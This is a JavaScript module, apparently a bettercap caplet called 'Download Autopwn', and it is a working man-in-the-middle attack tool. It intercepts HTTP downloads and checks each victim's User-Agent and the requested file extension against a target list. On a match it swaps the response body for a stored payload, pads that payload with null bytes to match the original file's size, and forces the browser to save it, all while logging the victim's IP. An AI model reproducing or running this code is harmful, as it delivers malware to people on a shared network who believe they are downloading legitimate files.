var targets = {}

var nullbyte = "\u0000"

var green   = "\033[32m",
    boldRed = "\033[1;31m",
    onRed   = "\033[41m",
    reset   = "\033[0m",
    redLine = "\n  " + onRed + " " + reset

function onLoad() {
	devices = env["downloadautopwn.devices"].split(",")
	logStr = ""
	for (var i = 0; i < devices.length; i++) {
		item = {
			"device": devices[i],
			"useragent": env[ "downloadautopwn.useragent." + devices[i] ],
			"extensions": env[ "downloadautopwn.extensions." + devices[i] ].toLowerCase().split(",")
		}
		targets[i] = item
		logStr += "\n  " + green + targets[i]["device"] + reset +
		          "\n    User-Agent: " + targets[i]["useragent"] + 
		          "\n    Extensions: " + targets[i]["extensions"] + "\n"
	}
	log("Download Autopwn loaded.\n\nDownload Autopwn targets: \n" + logStr)
}

function onResponse(req, res) {
	// First of all check whether the requested path might have an extension (to save cpu)
	var requestedFileName = req.Path.replace(/.*\//g, "")
	if ( requestedFileName.indexOf(".") != -1 ) {
		var userAgent = req.GetHeader("User-Agent", ""),
		    extension
		// Iterate through targets
		for ( var t = 0; t < Object.keys(targets).length; t++ ) {
			// Check if User-Agent is a target
			regex = new RegExp(targets[t]["useragent"])
			if ( userAgent.match(regex) ) {
				// Iterate through target extensions
				for (var e = 0; e < targets[t]["extensions"].length; e++) {
					// Check if requested path contains a targeted extension
					// function endsWith() could be a nice simplification here
					if ( requestedFileName.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
						extension = targets[t]["extensions"][e]
						// Autopwn
						logStr = "\n" + redLine + "  Autopwning download request from " + boldRed + req.Client.IP + reset + 
						         redLine + 
						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
						         redLine + 
						         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
						// Check our payload size
						payload = readFile("/usr/local/share/bettercap/caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
						payloadSize = payload.length
						logStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
						if ( env["downloadautopwn.resizepayloads"] == "true" ) {
							// Check requested file size
							requestedFileSize = parseInt(res.GetHeader("Content-Length", "0"))
							if (requestedFileSize == 0) {
								requestedFileSize = res.ReadBody().length
							}
							logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"
							// Append nullbytes if required
							if (requestedFileSize > payloadSize) {
								logStr += redLine + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
								sizeDifference = requestedFileSize - payloadSize
								nullbyteString = Array(sizeDifference + 1).join(nullbyte)
								payload += nullbyteString
							}
						}
						// Set Content-Disposition header to enforce file download instead of in-browser preview
						res.SetHeader("Content-Disposition", "attachment; filename=\"" + requestedFileName + "\"")
						// Update Content-Length header
						res.RemoveHeader("Content-Length")
						logStr += redLine + 
						          redLine + "  Serving your payload to " + boldRed + req.Client.IP + reset + "...\n"
						log(logStr)
						res.Body = payload
					}
				}
			}
		}
	}
}
